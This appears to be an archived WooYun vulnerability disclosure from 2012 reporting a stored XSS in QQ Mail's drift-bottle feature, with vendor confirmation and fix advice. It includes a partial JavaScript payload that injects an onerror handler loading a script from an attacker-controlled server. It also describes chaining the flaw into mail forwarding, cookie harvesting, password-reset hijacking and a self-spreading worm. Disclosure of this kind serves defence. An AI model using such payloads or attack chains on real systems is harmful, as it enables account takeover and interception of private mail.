@@ -1,0 +1,334 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		漂流瓶：飘来的可能是局长，也可能是XSS , Orz ...  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		漂流瓶：飘来的可能是局长，也可能是XSS , Orz ...  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-08-10 08:43</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-08-10：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-08-20：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-08-30：	细节向普通白帽子公开<br/>
+									2012-09-09：	细节向实习白帽子公开<br/>
+									2012-09-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一只漂流瓶向你飘了过来。。它飘来的可能是对美好生活的向往，可能是对世俗的抱怨，可能是某局长发来的某某某，它，还有可能是XSS！。漂流瓶，作为一项个人认为是“娱乐”的功能，却放在了QQ邮箱这种涉及到个人隐私和私密信息的系统里，一旦存在漏洞，将会导致QQ邮箱本身的安全防护荡然无存。在这个帖子里，我给大家演示的就是，当漂流瓶这个娱乐功能存在存储型XSS之后，对邮箱这个核心功能所带来的影响。 <br />
+<br />
+试想：<br />
+<br />
+1. 同学们～ 还敢玩漂流瓶么？ 当你打开一个漂流瓶之后，QQ号码信息，邮箱里的小秘密就被我知道了，会是一种什么感觉呢？ <br />
+2. 如果用这个东西做一个主动扩散的蠕虫，哇咔咔，一夜春风来，花落知多少啊，知多少......会有多少邮箱被设置转发到俺邮箱啦！！！<br />
+<br />
+同时，在PKAV小组官网上，也对相关细节进行了描述，具体见：http://pkav.net/2012/08/qq-piaoliuping-xss/  （为了避免利用代码对厂商造成的危害，现在对此文进行了加密操作，厂商对漏洞修复后，将进行公开）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 漏洞成因：漂流瓶某处参数过滤不当，导致存储型XSS。<br />
+<br />
+<br />
+<br />
+具体测试过程：<br />
+<br />
+<br />
+<br />
+1.1 发送一个漂流瓶，并使用漂流瓶的录音功能。<br />
+<br />
+1.2 定位到发送的漂流上，F12打开调试工具看代码。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10020819c1abb801ebd5a1bbc33668e425abb1a6.jpg" target="_blank"><img src="../images/10020819c1abb801ebd5a1bbc33668e425abb1a6.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+1.3 同时查看抓包的代码，可以看到相同内容。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10020833657599e21dd010b2ed74e848fd4894da.jpg" target="_blank"><img src="../images/10020833657599e21dd010b2ed74e848fd4894da.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+1.4 进而进行字符测试，测试使用\u0022\u003E时，发生侧漏<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1002084270a04f16949529b215d39edc9a2a8a17.jpg" target="_blank"><img src="../images/1002084270a04f16949529b215d39edc9a2a8a17.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+1.5 说明这里对反斜线的过滤存在问题。<br />
+<br />
+<br />
+<br />
+1.6 进一步构造我们的利用代码。下面仅贴出部分源码。<br />
+<br />
+<br />
+<br />
+请求时的利用代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>var serv=&quot;恶意外部JS文件所在服务器&quot;;<br />
+	var mail2rec=&quot;接受转发的邮箱&quot;;<br />
+	var mailUin=&quot;发送恶意漂流瓶的Hacker QQ&quot;;<br />
+	var evil_code=&quot;voice_21121721212136.mp3\\u0022\\u003e\\u003cimg src=1 onerror=\\u0022loadJSSrc(\\u0027&quot;+serv+&quot;?u=&quot;+mail2rec+&quot;\\u0026i=&quot;+mailUin+&quot;\\u0027);this.style.display=\\u0027none\\u0027\\u0022\\u003e\\u003cb a=\\u0022&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+进行修改邮箱转发设置及传播时，自动扔回大海，删除瓶子等代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>@see http://itsokla.duapp.com/qq_piaoliuping_xss_code.txt</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+代码中，所用到的pkav Object 见 http://itsokla.duapp.com/pkav.js (from http://pkav.net)<br />
+<br />
+<br />
+<br />
+2. 因为成因并不是很复杂，这里主要强调后续利用带来的影响。<br />
+<br />
+<br />
+<br />
+邮箱业务和漂流瓶处于同一域名下。就算是cookie加了保护，我们也可以直接通过ajax对邮箱的数据进行操作。因而这里带来的危害是很明显的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1002085710d781768f6bb9ed192978a93d485564.jpg" target="_blank"><img src="../images/1002085710d781768f6bb9ed192978a93d485564.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 我们以设置邮箱转发作为危害实例。根据缺陷，我们构造好利用代码，并编写利用工具。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10020911176ae8187928c14681d6cf7139b18f72.jpg" target="_blank"><img src="../images/10020911176ae8187928c14681d6cf7139b18f72.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 在我们发送带有恶意代码的漂流瓶之后，打开我们的收件邮箱，可以看到受害者的邮箱被设置转发了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10020929b20ec7c9efa59421ee2737f46654f196.jpg" target="_blank"><img src="../images/10020929b20ec7c9efa59421ee2737f46654f196.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 这里以我的小号做邮件转发测试，向我的受害者小号发送邮件之后，我们可以在收信箱里看到我们“监听”收到的邮件～<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1002095203986820ea662f21afd06f5ad727cc16.jpg" target="_blank"><img src="../images/1002095203986820ea662f21afd06f5ad727cc16.jpg" alt="" width="600"/></a></p><p class="detail"> <br />
+<br />
+<br />
+<br />
+6. 当然上面只是第一级的危害。我们还可以进一步扩大危害范围。<br />
+<br />
+<br />
+<br />
+7. 配合cookies收集，我们很容易从cookies里得到受害者的QQ号码信息。进而通过QQ资料获取更多的信息。以便下一步进行攻击！<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10021009956aaa3eca617536d0ef5af6ca814f70.jpg" target="_blank"><img src="../images/10021009956aaa3eca617536d0ef5af6ca814f70.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. 这里再“假设”受害者同时是微博的用户，或者百度的用户，由于微博或者百度官方通常会发一些系统提醒邮件，这个时候我们可以进一步获取受害人信息。（其实不用假设，经过取样分析，这种情况是很常见的。）：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/100210191a7347c88f81234ce620c87a60087aa0.jpg" target="_blank"><img src="../images/100210191a7347c88f81234ce620c87a60087aa0.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+那么我们如果利用百度的密码找回功能。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1002103296a5b724b8e022d04e1396be861786d7.jpg" target="_blank"><img src="../images/1002103296a5b724b8e022d04e1396be861786d7.jpg" alt="" width="600"/></a></p><p class="detail"> <br />
+<br />
+<br />
+<br />
+可以看到我们就可以收到对方的密码修改邮件，从而实现密码的修改。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10021047c96811aca5f1c6afa6783fff8ad6cd9a.jpg" target="_blank"><img src="../images/10021047c96811aca5f1c6afa6783fff8ad6cd9a.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 上面只是以百度作为例子，现在的密码找回功能，很多都是与邮箱挂钩的！而当前许多用户都是使用的QQ邮箱，因而会威胁到用户其它网站的安全。<br />
+<br />
+<br />
+<br />
+11. 由于是同域，我们甚至可以伪装受害者向受害者的朋友发送欺诈邮件，由于是二次攻击，信任关系增强，危害将会变得更大。<br />
+<br />
+<br />
+<br />
+12. 当然，漂流瓶这个蠕虫，还有个特点，就是利用漂流瓶自己的传播功能，自发蠕虫，隐蔽，不易被发现。<br />
+<br />
+<br />
+<br />
+13. 我们不难看到，一个娱乐圈的混进了行政圈，带来了多么严重操蛋的后果啊！！ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明！ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复方法：<br />
+<br />
+<br />
+<br />
+1. 修复当前XSS问题，但不能保证漂流瓶的其它功能是否存在类似问题。<br />
+<br />
+<br />
+<br />
+2. 架构有问题，建议将漂流瓶这个功能与邮箱进行业务隔离。以免因小失大！<br />
+<br />
+<br />
+<br />
+3. 建议将“邮件转发”这种涉及到邮件安全的设置动作，加上验证码操作，以防止由于普通XSS而导致的后门功能！<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-010770" title="漂流瓶：飘来的可能是局长，也可能是XSS , Orz ...">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-08-10 12:52</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢gainover的报告，我们已在着手修复此问题。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="10770";
+var bugRating="2";
+var myRating="";
+var ratingCount="7";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
